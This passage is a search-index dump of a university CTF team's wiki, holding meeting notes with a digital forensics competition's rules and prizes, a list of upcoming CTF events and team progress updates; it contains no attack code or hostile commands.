u7edc\u8bc4\u5ba1\u7ed3\u679c\uff0c\u6392\u540d\u524d50\u7684\u53c2\u8d5b\u961f\u4f0d\u8fdb\u5165\u51b3\u8d5b\u3002</p> <p>\u51b3\u8d5b\u8bc4\u5ba1\uff1a\u7ec4\u59d4\u4f1a\u7ec4\u7ec7\u8bc4\u5ba1\u4e13\u5bb6\u5bf9\u6bcf\u4e2a\u7ade\u8d5b\u4f5c\u54c1\u8fdb\u884c\u73b0\u573a\u8bc4\u5ba1\u3002\u8bc4\u5ba1\u5b9e\u884c\u5206\u9879\u6253\u5206\uff0c\u96c6\u4f53\u8ba8\u8bba\uff0c\u6700\u7ec8\u786e\u5b9a\u53c2\u8d5b\u4f5c\u54c1\u7684\u83b7\u5956\u7b49\u7ea7\u3002\u4e13\u5bb6\u8bc4\u5ba1\u7684\u4e3b\u8981\u5185\u5bb9\u5305\u62ec\uff1a\u4f5c\u54c1\u7684\u539f\u521b\u6027\u4e0e\u521b\u65b0\u6027\u3001\u4f5c\u54c1\u7684\u6027\u80fd\u53ca\u5e94\u7528\u4ef7\u503c\u3001\u7b54\u8fa9\u6548\u679c\u3001\u6f14\u793a\u6548\u679c\u7b49\u3002</p> <p>\u4e09\u3001\u4f5c\u54c1\u8981\u6c42</p> <ol> <li> <p>\u53c2\u8d5b\u4f5c\u54c1\u8981\u4f53\u73b0\u4e00\u5b9a\u7684\u521b\u65b0\u6027\u548c\u5b9e\u7528\u6027\u3002</p> </li> <li> <p>\u53c2\u8d5b\u4f5c\u54c1\u53ef\u4ee5\u662f\u8f6f\u4ef6\u3001\u786c\u4ef6\u7b49\u3002\u53c2\u8d5b\u4f5c\u54c1\u7684\u5185\u5bb9\u4ee5\u6570\u5b57\u53d6\u8bc1\u6280\u672f\u4e0e\u5e94\u7528\u8bbe\u8ba1\u4e3a\u4e3b\uff0c\u8303\u56f4\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff1a\u7cfb\u7edf\u53d6\u8bc1\u3001\u7f51\u7edc\u5b89\u5168\u53d6\u8bc1\u3001\u5185\u5bb9\u53d6\u8bc1\u3001\u7269\u8054\u7f51\u53ca\u8bbe\u5907\u53d6\u8bc1\u3001\u65b0\u578b\u7535\u5b50\u6570\u636e\u53d6\u8bc1\u7b49\u65b0\u6280\u672f\u53ca\u65b0\u9886\u57df\u53d6\u8bc1\u3002</p> </li> </ol> <p>\u4f5c\u54c1\u53ef\u9009\u65b9\u5411\uff1a\u6570\u5b57\u6c34\u5370\u3001\u5185\u5b58\u53d6\u8bc1\u3001\u8bbe\u5907\u53d6\u8bc1\u3001\u786c\u4ef6\u53d6\u8bc1\u3001\u7269\u8054\u7f51\u53d6\u8bc1\u3001\u64cd\u4f5c\u7cfb\u7edf\u53d6\u8bc1\u3001\u4e91\u53d6\u8bc1\u3001\u97f3\u9891\u53d6\u8bc1\u3001\u89c6\u9891\u53d6\u8bc1\u3001\u56fe\u50cf\u53d6\u8bc1\u3001\u6587\u672c\u53d6\u8bc1\u3001\u53cd\u53d6\u8bc1\u3001\u6570\u636e\u590d\u5236\u3001\u52a0\u5bc6\u53ca\u89e3\u5bc6\u3001\u9690\u85cf\u53ca\u68c0\u6d4b\u3001\u6570\u636e\u590d\u539f\u3001\u6570\u636e\u622a\u53d6\u3001\u6570\u636e\u6b3a\u9a97\u3001\u6570\u5b57\u7b7e\u540d\u53ca\u65f6\u95f4\u6233\u3001\u6570\u636e\u626b\u63cf\u3001\u8ffd\u8e2a\u53ca\u6eaf\u6e90\u3001AI\u53d6\u8bc1\u3001\u533a\u5757\u94fe\u53d6\u8bc1\u3001\u573a\u666f\u53d6\u8bc1\u3001\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b\u3001AI\u6a21\u578b\u6c34\u5370\u3001\u6df1\u5ea6\u4f2a\u9020\u53d6\u8bc1\u3001\u5176\u4ed6\u3002</p> <ol> <li> <p>\u6240\u6709\u53c2\u8d5b\u9898\u76ee\u987b\u5f97\u5230\u7ec4\u59d4\u4f1a\u8ba4\u53ef\u540e\u65b9\u53ef\u53c2\u8d5b\u3002\u5982\u679c\u53c2\u8d5b\u961f\u4f0d\u6240\u62a5\u9898\u76ee\u53ca\u5185\u5bb9\u6d89\u53ca\u8fdd\u53cd\u8d5b\u4e8b\u7cbe\u795e\u548c\u7ae0\u7a0b\uff0c\u7ec4\u59d4\u4f1a\u6709\u6743\u8981\u6c42\u53c2\u8d5b\u961f\u4f0d\u8fdb\u884c\u4fee\u6539\u3002\u672c\u8d5b\u4e8b\u4e0d\u63a5\u53d7\u4efb\u4f55\u4e0e\u56fd\u5bb6\u6709\u5173\u6cd5\u5f8b\u3001\u6cd5\u89c4\u76f8\u8fdd\u80cc\u7684\u9898\u76ee\u3002</p> </li> <li> <p>\u53c2\u8d5b\u4f5c\u54c1\u5e94\u8be5\u662f\u53c2\u8d5b\u961f\u72ec\u7acb\u8bbe\u8ba1\u3001\u5f00\u53d1\u5b8c\u6210\u7684\u539f\u521b\u6027\u4f5c\u54c1\uff0c\u4e25\u7981\u6284\u88ad\u3001\u527d\u7a83\u3001\u4e00\u7a3f\u591a\u6295\u7b49\u884c\u4e3a\u3002\u51e1\u53d1\u73b0\u6b64\u7c7b\u884c\u4e3a\uff0c\u5c06\u53d6\u6d88\u53c2\u8d5b\u961f\u4f0d\u7684\u53c2\u8d5b\u8d44\u683c\uff0c\u5e76\u4fdd\u7559\u8ffd\u7a76\u76f8\u5173\u6307\u5bfc\u6559\u5e08\u53ca\u5355\u4f4d\u8d23\u4efb\u7684\u6743\u5229\u3002</p> </li> <li> <p>\u51e1\u5df2\u516c\u5f00\u53d1\u5e03\u5e76\u5df2\u83b7\u5f97\u5546\u4e1a\u4ef7\u503c\u7684\u4ea7\u54c1\u4e0d\u5f97\u53c2\u8d5b\uff1b\u51e1\u6709\u77e5\u8bc6\u4ea7\u6743\u7ea0\u7eb7\u7684\u4f5c\u54c1\u4e0d\u5f97\u53c2\u8d5b\uff1b\u4e0e\u4f01\u4e1a\u5408\u4f5c\u5373\u5c06\u5bf9\u5916\u53d1\u5e03\u7684\u4ea7\u54c1\u4e0d\u5f97\u53c2\u8d5b\u3002</p> </li> <li> <p>\u4f5c\u54c1\u76f8\u5173\u6587\u6863\u81f3\u5c11\u5305\u62ec\u5982\u4e0b\u5185\u5bb9\uff1a</p> </li> </ol> <p>\uff081\uff09\u4f5c\u54c1\u8bbe\u8ba1\u62a5\u544a\uff1a\u529f\u80fd\u3001\u6307\u6807\u3001\u5b9e\u73b0\u539f\u7406\u3001\u786c\u4ef6\u6846\u56fe\u3001\u8f6f\u4ef6\u6d41\u7a0b\u3001\u7cfb\u7edf\u6f14\u793a\u622a\u56fe\u7b49\uff1b</p> <p>\u4e0b\u8f7d\u4f5c\u54c1\u8bbe\u8ba1\u62a5\u544a\u6a21\u677f   \u63d0\u53d6\u7801: i87b</p> <p>\uff082\uff09\u6f14\u793a\u89c6\u9891\uff08mp3\u7b49\uff09\uff1a\u4e0d\u8d85\u8fc75\u5206\u949f\u7684\u6f14\u793a\u89c6\u9891\uff08\u914d\u76f8\u5173\u8bb2\u89e3\u8bed\u97f3\u7b49\uff09\uff1b</p> <p>\uff083\uff09\u5176\u4ed6\u6587\u6863\uff1a\u4ee5\u53ca\u9664\u4e0a\u8ff0\u89c4\u5b9a\u6587\u6863\u4ee5\u5916\u7684\u5176\u4ed6\u4f5c\u54c1\u76f8\u5173\u8d44\u6599\u7b49\uff1b</p> <p>\u56db\u3001\u6210\u7ee9\u8ba1\u7b97</p> <ol> <li>\u521d\u8d5b\u8bc4\u5206\u65b9\u5f0f</li> </ol> <p>\u7ec4\u59d4\u4f1a\u5c06\u7ec4\u7ec7\u8bc4\u5ba1\u4e13\u5bb6\u56e2\u5bf9\u5165\u56f4\u521d\u8d5b\u4f5c\u54c1\u8fdb\u884c\u8bc4\u5ba1\uff0c\u5c06\u6839\u636e\u53c2\u8d5b\u4f5c\u54c1\u7684\u539f\u521b\u6027\u3001\u521b\u65b0\u6027\u3001\u529f\u80fd\u6027\u3001\u5b9e\u7528\u6027\u3001\u4f5c\u54c1\u5b8c\u6574\u6027\u7b49\u591a\u4e2a\u65b9\u9762\u8fdb\u884c\u6253\u5206\u8bc4\u5ba1\u3002\u521d\u8d5b\u5c06\u91c7\u7528100\u5206\u5236\uff0c\u5f97\u5206\u5728\u524d50%\u7684\u4f5c\u54c1\u5c06\u5165\u56f4\u51b3\u8d5b\u3002</p> \u5e8f\u53f7 \u7c7b\u522b \u8bc4\u5ba1\u6807\u51c6 \u5206\u503c 1 \u4f5c\u54c1\u9009\u9898\u53ca\u6587\u6863\u89c4\u8303\u6027 \u5efa\u8bae\u4ece\u4f5c\u54c1\u9009\u9898\u53ca\u610f\u4e49\u3001\u6587\u6863\u7ed3\u6784\u3001\u8bed\u8a00\u8868\u8fbe\u53ca\u903b\u8f91\u7ed3\u6784\u3001\u4f5c\u54c1\u7279\u8272\u5448\u73b0\u3001\u6d4b\u8bd5\u53ca\u5bf9\u6bd4\u6548\u679c\u7b49\u65b9\u9762\u8fdb\u884c\u8bc4\u5ba1 15 2 \u4f5c\u54c1\u7684\u529f\u80fd\u6548\u679c \u5efa\u8bae\u4ece\u4f5c\u54c1\u7684\u9700\u6c42\u5206\u6790\u3001\u529f\u80fd\u5b9e\u73b0\u3001\u7cfb\u7edf\u5b8c\u6574\u6027\u7b49\u65b9\u9762\u8fdb\u884c\u8bc4\u5ba1 30 3 \u4f5c\u54c1\u7684\u6280\u672f\u5b9e\u73b0 \u5efa\u8bae\u4ece\u4f5c\u54c1\u5b9e\u73b0\u6d41\u7a0b\u53ca\u6846\u67b6\u5408\u7406\u6027\u3001\u65b9\u6848\u53ef\u884c\u6027\u7b49\u65b9\u9762\u8fdb\u884c\u8bc4\u5ba1 30 4 \u4f5c\u54c1\u7684\u521b\u65b0\u6027\u548c\u5b9e\u7528\u6027 \u5efa\u8bae\u4ece\u529f\u80fd\u5b8c\u6210\u5ea6\u3001\u5e02\u573a\u5e94\u7528\u524d\u666f\u3001\u6838\u5fc3\u6280\u672f\u7684\u6027\u80fd\u6307\u6807\u3001\u7ade\u54c1\u5206\u6790\u7b49\u65b9\u9762\u8fdb\u884c\u8bc4\u5ba1 25 \u603b \u5206 100 <ol> <li>\u51b3\u8d5b\u8bc4\u5206\u65b9\u5f0f</li> </ol> <p>\u8fdb\u5165\u51b3\u8d5b\u7684\u4f5c\u54c1\u5c06\u9700\u8981\u8fdb\u884c\u73b0\u573a\u7b54\u8fa9\u548c\u4ea7\u54c1\u6f14\u793a\u3002\u8bc4\u5ba1\u4e13\u5bb6\u5c06\u4f9d\u636e\u4f5c\u54c1\u7684\u539f\u521b\u6027\u4e0e\u521b\u65b0\u6027\u3001\u4f5c\u54c1\u5b8c\u6210\u7a0b\u5ea6\u3001\u4f5c\u54c1\u7684\u6027\u80fd\u3001\u4f5c\u54c1\u7684\u5e94\u7528\u4ef7\u503c\u3001\u76f8\u5173\u6587\u6863\u7684\u89c4\u8303\u6027\u3001\u4ea7\u54c1\u6f14\u793a\u3001\u7b54\u8fa9\u8bc4\u5206\u7b49\u65b9\u9762\u8fdb\u884c\u7efc\u5408\u8bc4\u5224\u5f97\u51fa\u3002</p> <p>\u4e94\u3001\u5956\u9879\u8bf4\u660e</p> <p>1\u3001\u672c\u5c4a\u7ade\u8d5b\u8bbe\u4e00\u7b49\u5956\u3001\u4e8c\u7b49\u5956\u548c\u4e09\u7b49\u5956\u3002</p> <p>\u4e00\u7b49\u5956\uff1a1-5\u540d\uff08\u7b2c1\u540d20000\u5143\u3001\u7b2c2-5\u540d10000\u5143\uff09\uff0c\u5956\u676f\u3001\u83b7\u5956\u8bc1\u4e66\u7b49\u5956\u52b1\uff1b</p> <p>\u4e8c\u7b49\u5956\uff1a6-15\u540d\uff0c\u83b7\u5956\u8bc1\u4e66\uff1b</p> <p>\u4e09\u7b49\u5956\uff1a16-30\u540d\uff0c\u83b7\u5956\u8bc1\u4e66\uff1b</p> <p>2\u3001\u4f18\u79c0\u6307\u5bfc\u8001\u5e0810\u540d\uff1a5000\u5143\u5956\u91d1\u3001\u5956\u676f\u3001\u83b7\u5956\u8bc1\u4e66</p> <p>\u516d\u3001\u6307\u5bfc\u6559\u5e08</p> <p>1\u3001\u9ad8\u6821\u6307\u5bfc\u6559\u5e08\u53ef\u4ee5\u6307\u5bfc\u5b66\u751f\u9009\u9898\u548c\u8bbe\u8ba1\u65b9\u6848\u7684\u8bba\u8bc1\uff0c\u4f46\u5177\u4f53\u7684\u786c\u4ef6\u5236\u4f5c\u3001\u8f6f\u4ef6\u7f16\u7a0b\u3001\u7cfb\u7edf\u8c03\u8bd5\u3001\u4f5c\u54c1\u6587\u6863\u64b0\u5199\u5fc5\u987b\u7531\u53c2\u8d5b\u5b66\u751f\u72ec\u7acb\u5b8c\u6210\u3002</p> <p>2\u3001\u6307\u5bfc\u6559\u5e08\u8d1f\u8d23\u628a\u63e1\u53c2\u8d5b\u4f5c\u54c1\u7684\u539f\u521b\u6027\uff0c\u5e76\u786e\u4fdd\u5176\u4e0d\u4e0e\u56fd\u5bb6\u6cd5\u5f8b\u3001\u6cd5\u89c4\u76f8\u8fdd\u80cc\u3002</p> <p>3\u3001\u7ec4\u59d4\u4f1a\u5c06\u8bc4\u9009\u4f18\u79c0\u6307\u5bfc\u6559\u5e08\uff0c\u5e76\u4e88\u4ee5\u8868\u5f70\u3002</p> <p>\u4e03\u3001\u8054\u7edc\u4fe1\u606f</p> <ol> <li> <p>\u79d8\u4e66\u5904\u8054\u7cfb\u7535\u8bdd\uff1a025-58235309\uff1b\u90ae\u7bb1\uff1adf@nuist.edu.cn</p> </li> <li> <p>\u8054\u7cfb\u4eba\uff1a</p> </li> </ol> <p>\uff081\uff09\u62a5\u540d\u54a8\u8be2\uff1a\u5f20\u7fd4\uff0c13133758775</p> <p>\uff082\uff09\u6280\u672f\u652f\u6301\uff1a\u5947\u5b89\u4fe195015</p> <p>\uff083\uff09\u4e13\u5bb6\u7ec4\u652f\u6301\uff1a\u738b\u91d1\u4f1f\uff0c13851994653\uff1b\u718a\u793c\u6cbb\uff0c18761698573</p> <ol> <li> <p>\u79d8\u4e66\u5904\u901a\u4fe1\u5730\u5740\uff1a\u6c5f\u82cf\u7701\u5357\u4eac\u5e02\u5b81\u516d\u8def219\u53f7\u6570\u5b57\u53d6\u8bc1\u6559\u80b2\u90e8\u5de5\u7a0b\u7814\u7a76\u4e2d\u5fc3\uff0c210044</p> </li> <li> <p>\u5b98\u65b9\u516c\u4f17\u53f7\uff1a</p> </li> </ol> <p></p> <ol> <li>\u9996\u5c4a\u76d8\u53e4\u77f3\u676f\u53d6\u8bc1\u8d5b\u5b98\u65b9QQ\u7fa4\uff1a549687349  </li> </ol> <p>\u5907\u6ce8:\u540e\u7eed\u518d\u5f00\u7fa4\u5c06\u53e6\u884c\u901a\u77e5\u3002</p> <p>\u516b\u3001\u5176\u5b83</p> <p>\u672c\u53c2\u8d5b\u4ecb\u7ecd\u7684\u6700\u7ec8\u89e3\u91ca\u6743\u5f52\u7ade\u8d5b\u7ec4\u59d4\u4f1a\u3002</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-04-27/#d3-ctf-2023","title":"D^3 CTF 2023","text":"<p>\u62a5\u540d</p> <ul> <li>\u9884\u70ed\u4efb\u52a1</li> </ul> <p>\u8682\u8681\u96c6\u56e2\u5b89\u5168\u54cd\u5e94\u4e2d\u5fc3 \u9884\u70ed\u4efb\u52a1AntCTFXD^3CTF</p> <p>\u4efb\u52a1\u65f6\u95f4\uff1a2023 \u5e74 4 \u6708 8 \u65e5 00:00 - 2023 \u5e74 4 \u6708 23 \u65e5 23:59</p> <ul> <li>\u7ebf\u4e0a\u8d5b</li> </ul> <p>\u8bf7\u5728\u5f00\u8d5b\u4e4b\u524d\u524d\u5f80\u3010\u6bd4\u8d5b\u5e73\u53f0\u3011\u6ce8\u518c\u8d26\u53f7\uff0c\u6bcf\u652f\u961f\u4f0d\u5171\u7528\u4e00\u4e2a\u8d26\u53f7\u3002\u8d5b\u9898\u8303\u56f4\uff1aWeb\u3001Pwnable\u3001Reverse\u3001Crypto\u3001Misc\u3001RealWorld\u3002</p> <p>\u5f00\u653e\u6ce8\u518c\u65f6\u95f4\uff1a2023 \u5e74 4 \u6708 13 \u65e5 09:00 - 2023 \u5e74 4 \u6708 28 \u65e5 20:00</p> <p>\u6bd4\u8d5b\u65f6\u95f4</p> <p>2023 \u5e74 4 \u6708 28 \u65e5 20:00 \uff0d 2023 \u5e74 4 \u6708 30 \u65e5 20:00</p> <p>\u8d5b\u5236\u8bf4\u660e</p> <p>\u7ebf\u4e0a\u8d5b\u4e3a Jeopardy CTF\uff0c\u9762\u5411\u5168\u7403\u6218\u961f\u5f00\u653e\uff0c\u8bf7\u5728\u5f00\u8d5b\u524d\u524d\u5f80\u6211\u4eec\u7684\u6bd4\u8d5b\u5e73\u53f0\u6ce8\u518c\u8d26\u53f7\u3002\u6211\u4eec\u5c06\u5f00\u542f\u53cd\u4f5c\u5f0a\u4e0e\u52a8\u6001\u79ef\u5206\u7cfb\u7edf\uff0c\u68c0\u6d4b\u5230\u4f5c\u5f0a\u884c\u4e3a\u5c06\u88ab\u81ea\u52a8\u5c01\u7981\uff0c\u9898\u76ee\u5206\u6570\u4f1a\u968f\u7740\u89e3\u51fa\u961f\u4f0d\u6570\u91cf\u7684\u589e\u52a0\u800c\u51cf\u5c11\u3002</p> <p>\u6bd4\u8d5b\u5956\u52b1</p> <p>\ud83c\udfc6 \u51a0\u519b\uff1a\u00a550000\ud83e\udd48 \u4e9a\u519b\uff1a\u00a530000\ud83e\udd49 \u5b63\u519b\uff1a\u00a510000\ud83c\udf81 \u7b2c\u56db\u540d\uff1a\u00a55000\ud83c\udf81 \u7b2c\u4e94\u540d\uff1a\u00a55000\ud83c\udf81 \u7b2c\u516d\u540d\uff1a\u00a55000\ud83c\udf81 \u7b2c\u4e03\u540d-\u7b2c\u5341\u4e8c\u540d\uff1a\u00a52000</p> <p>\u8054\u7cfb\u6211\u4eec</p> <p></p> <p>D^3CTF 2023 \u5b98\u65b9 QQ \u7fa4</p> <p></p> <p>D^3CTF 2023 \u5b98\u65b9\u9489\u9489\u4ea4\u6d41\u7fa4</p> <p>Telegram\uff1ahttps://t.me/d3ctf</p> <p>IRC\uff1a#d3ctf (Freenode)</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/","title":"CTF Week Meeting 2023-05-11","text":"<p>We're gearing up for the upcoming National Competition. We'll also be providing training sessions to sharpen our skills and stay up-to-date with the latest trends in cybersecurity. To make sure that we're all on the same page and fully prepared, I'll be holding individual meetings with each member of the team. Let's work together to take our cybersecurity expertise to new heights!</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>Topic: CTF combined with research - 20%</li> <li>Multi-platform promotion of COMPASS CTF - 30%</li> <li>New Platform GZCTF - 55%</li> <li>Wiki page content adjustment - 100%</li> <li>CTFtime program: play CTF and share - 34%</li> <li>New Member Recruitment - 80%</li> <li>CTF from Practice to Principle - 30%</li> <li>National College Student Information Security Contest - 50%</li> <li>Discussions with Other Universities about National College Student Information Software Competition - 100%</li> <li>Individual Meetings with our members - 0% brief idea</li> <li>COMPASS Infosec Game CTF - 0% brief idea</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Invitation and the Register about the National Competition.</li> <li>Individual Meetings with our members.</li> <li>COMPASS Infosec Game CTF.</li> <li>Upcoming Events.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#0x1-invitation-and-the-register-about-the-national-competition","title":"0x1. Invitation and the Register about the National Competition","text":""},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#0x2-individual-meetings-with-our-members","title":"0x2. Individual Meetings with our members","text":"<p>During this chapter of the meeting, we will be discussing how we can improve our hacking skills for fun and for the benefit of our team. We'll go through each member's strengths, weaknesses, and areas of interest to better understand how we can collaborate and tackle various challenges more effectively. We'll discuss techniques, tools, and strategies for hacking and explore avenues for earning more opportunities in the field. Whether you're a seasoned hacker or just starting out, this chapter of the meeting will provide you with valuable insights and ideas for enhancing your skills and contributing to the team's success. We will also share tips and resources for staying motivated and engaged in the exciting world of cybersecurity.</p> <p>I will contact you and arrange time for the meeting.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#0x3-compass-infosec-game-ctf","title":"0x3. COMPASS Infosec Game CTF","text":"<p>Before the June, we are going to hold a university competition, that contains both JeoPardy form challenges, and the offline AwD form final round.</p> <pre><code>Dear Students,\n\nWe are pleased to announce the COMPASS Infosec Game, a university competition about information security that will be held on [date]. The competition's main objective is to invite CTF players from other universities to participate and showcase their skills in cybersecurity.\n\nAs a student of SUSTech, we invite you to partake in this exciting competition. We are offering special prizes and commendations to the winning teams. It is a great opportunity to not only challenge your information security skills and knowledge, but also to represent your university and make new connections with like-minded individuals from other universities.\n\nTo register, please contact us with your team and member information before [registration deadline]. Once registered, we will provide you with further details about the competition format, timeline, and logistics.\n\nWe look forward to seeing you in action and promoting the growth of information security skills.\n\nBest regards, COMPASS CTF\n</code></pre> <p>This schedule is under construction.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#0x4-upcoming-events","title":"0x4. Upcoming Events","text":""},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#iscc2023","title":"*ISCC2023\u4e2a\u4eba\u6311\u6218\u8d5b","text":"<p>\u6bd4\u8d5b\u94fe\u63a5\uff1ahttps://www.isclab.org.cn/jsrk/</p> <p>\u6bd4\u8d5b\u7c7b\u578b\uff1a\u4e2a\u4eba\u8d5b</p> <p>\u62a5\u540d\u5f00\u59cb\uff1a2023-04-30 08:00</p> <p>\u62a5\u540d\u622a\u6b62\uff1a2023-05-25 18:00</p> <p>\u6bd4\u8d5b\u5f00\u59cb\uff1a2023-05-01 08:00</p> <p>\u6bd4\u8d5b\u7ed3\u675f\uff1a2023-05-25 18:00</p> <p>\u5176\u4ed6\u8bf4\u660e\uff1a</p> <p>QQ\u7fa4\uff1a751684975</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#neepu-ctf-2023","title":"\u4e1c\u5317\u7535\u529b\u5927\u5b66NEEPU-CTF 2023 \u516c\u5f00\u8d5b","text":"<p>\u6bd4\u8d5b\u94fe\u63a5\uff1ahttp://www.neepusec.fun:8090/</p> <p>\u6bd4\u8d5b\u7c7b\u578b\uff1a\u4e2a\u4eba\u8d5b</p> <p>\u62a5\u540d\u5f00\u59cb\uff1a2023\u5e745\u67081\u65e5</p> <p>\u62a5\u540d\u622a\u6b62\uff1a2023\u5e745\u670812\u65e5</p> <p>\u6bd4\u8d5b\u5f00\u59cb\uff1a2023\u5e745\u670819\u65e5 20\uff1a00</p> <p>\u6bd4\u8d5b\u7ed3\u675f\uff1a2023\u5e745\u670821\u65e5 20\uff1a00</p> <p>\u5176\u4ed6\u8bf4\u660e\uff1a</p> <p>\u6559\u52a1\u5904\u901a\u77e5\uff1ahttps://jwc.neepu.edu.cn/info/1014/2513.htm QQ\u7fa4\uff1a700517227</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#_1","title":"\u7b2c\u5341\u516d\u5c4a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u521d\u8d5b","text":"<p>\u6bd4\u8d5b\u94fe\u63a5\uff1ahttp://www.ciscn.cn/</p> <p>\u6bd4\u8d5b\u7c7b\u578b\uff1a\u56e2\u961f\u8d5b\uff5c1-4\u4eba</p> <p>\u62a5\u540d\u5f00\u59cb\uff1a2023\u5e744\u670827\u65e5</p> <p>\u62a5\u540d\u622a\u6b62\uff1a2023\u5e745\u670825\u65e5</p> <p>\u6bd4\u8d5b\u5f00\u59cb\uff1a2023\u5e745\u670827\u65e5</p> <p>\u6bd4\u8d5b\u7ed3\u675f\uff1a2023\u5e745\u670828\u65e5</p> <p>\u5176\u4ed6\u8bf4\u660e\uff1a</p> <p>\u5b98\u65b9QQ\u7fa4\u2460\uff1a568747643 \ufeff\u5b98\u65b9QQ\u7fa4\u2461\uff1a779329249 \ufeff\u5b98\u65b9QQ\u7fa4\u2462\uff1a780247795 \ufeff\u5b98\u65b9QQ\u7fa4\u2463\uff1a797605821</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#2023","title":"*2023\u5e74\u798f\u5efa\u7701\u7b2c\u56db\u5c4a\u201c\u95fd\u76fe\u676f\u201d\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u5927\u8d5b\uff08\u9ed1\u76fe\u5168\u56fd\u5927\u5b66\u751f\u8d5b\u9053\uff09","text":"<p>\u6bd4\u8d5b\u94fe\u63a5\uff1ahttp://heidunbei.si.net.cn/hdc/cover</p> <p>\u6bd4\u8d5b\u7c7b\u578b\uff1a\u56e2\u961f\u8d5b\uff5c1-3\u4eba</p> <p>\u62a5\u540d\u5f00\u59cb\uff1a2023\u5e745\u670810\u65e5</p> <p>\u62a5\u540d\u622a\u6b62\uff1a2023\u5e745\u670818\u65e5</p> <p>\u6bd4\u8d5b\u5f00\u59cb\uff1a2023\u5e745\u670820\u65e5\u7ebf\u4e0a\u9009\u62d4\u8d5b 5\u670821\u65e5\u7ebf\u4e0a\u590d\u8d5b</p> <p>\u6bd4\u8d5b\u7ed3\u675f\uff1a2023\u5e746\u67082\u65e5\u51b3\u8d5b</p> <p>\u5176\u4ed6\u8bf4\u660e\uff1a</p> <p>\u7ade\u8d5b\u5b98\u65b9QQ\u7fa4566180593</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#nssctf-round12","title":"NSSCTF Round#12","text":"<p>\u6bd4\u8d5b\u94fe\u63a5\uff1ahttps://www.nssctf.cn/index</p> <p>\u6bd4\u8d5b\u7c7b\u578b\uff1aMISC\u4e13\u9879\u4e2a\u4eba\u8d5b</p> <p>\u62a5\u540d\u5f00\u59cb\uff1a2023\u5e745\u670810\u65e5</p> <p>\u62a5\u540d\u622a\u6b62\uff1a2023\u5e745\u670820\u65e5</p> <p>\u6bd4\u8d5b\u5f00\u59cb\uff1a2023\u5e745\u670820\u65e510:00</p> <p>\u6bd4\u8d5b\u7ed3\u675f\uff1a2023\u5e745\u670820\u65e5</p> <p>\u5176\u4ed6\u8bf4\u660e\uff1a</p> <p>QQ\u7fa4\uff1a732339662</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-05-11/#2023litctf","title":"2023LitCTF&amp;\u90d1\u5dde\u8f7b\u5de5\u4e1a\u5927\u5b66\u9996\u5c4a\u65b0\u751f\u8d5b","text":"<p>\u6bd4\u8d5b\u94fe\u63a5\uff1ahttps://www.nssctf.cn/contest</p> <p>\u6bd4\u8d5b\u7c7b\u578b\uff1a\u56e2\u961f\u8d5b\uff5c1-4\u4eba</p> <p>\u62a5\u540d\u5f00\u59cb\uff1a\u65e0\u9700\u62a5\u540d</p> <p>\u62a5\u540d\u622a\u6b62\uff1a\u65e0\u9700\u62a5\u540d</p> <p>\u6bd4\u8d5b\u5f00\u59cb\uff1a2023\u5e745\u670813\u65e510:00</p> <p>\u6bd4\u8d5b\u7ed3\u675f\uff1a2023\u5e745\u670814\u65e517:00</p> <p>\u5176\u4ed6\u8bf4\u660e\uff1a</p> <p>QQ\u7fa4\uff1a782400974</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-06-29/","title":"CTF Week Meeting 2023-06-29","text":"<p>Congratulations to the COMPASS team for the first-class prize in the National College Computer Security Competition. The final contest would be held in July. We also have 2 teams that participated in the opus competition. The most amazing news is that we are going to have the summer recruitment in the next week. I'm planning an introduction talk as well.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-06-29/#work-progress-tracking","title":"Work progress tracking","text":"<ol> <li>Topic: CTF combined with research - 20%</li> <li>Multi-platform promotion of COMPASS CTF - 30%</li> <li>New Platform GZCTF - 55%</li> <li>CTFtime program: play CTF and share - 34%</li> <li>New Member Recruitment - 80%</li> <li>CTF from Practice to Principle - 45%</li> <li>Summer recruitment - ongoing</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-06-29/#what-we-discussed-this-week","title":"What we discussed this week","text":"<ol> <li>Congratulations on the first-class prize.</li> <li>Schedule and the current planning for the preliminary competition.</li> <li>Summer recruitment.</li> </ol>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-06-29/#0x1-congratulations-on-the-first-class-prize","title":"0x1. Congratulations on the first-class prize","text":"<p>Congratulations to COMPASS CTF and its exceptional team members on winning the first-class prize in the semi-final of the National College Computer Security Competition!</p> <p>Your remarkable achievement in this highly competitive event highlights your exceptional skills, dedication, and knowledge in the field of computer security. Securing the top spot in such a prestigious competition is a testament to your unwavering commitment to excellence and your ability to outperform other talented teams.</p> <p>Your success in the semi-final is a testament to your exceptional problem-solving abilities, critical thinking skills, and deep understanding of computer security concepts. This victory reflects the passion and diligence you have poured into your work, and it signifies your position as leader in this rapidly evolving field.</p> <p>May this sensational victory in the semi-final of the National College Computer Security Competition be the first of many remarkable achievements for COMPASS CTF. We are excited to see what the future holds for your talented team. Congratulations once again on this outstanding accomplishment, and best wishes for all your future endeavors!</p> <p>The official website grade public</p> <p>The national finals will be announced on July 1. The national finals will be held in late July, and we look forward to better results in the finals.</p>"},{"location":"Meeting/CTF%20Week%20Meeting%202023-06-29/#0x2-schedule-and-the-current-planning-for-the-preliminary-competition","title":"0x2. Schedule and the current planning for the preliminary competition","text":"<p>Congratulations also to our two 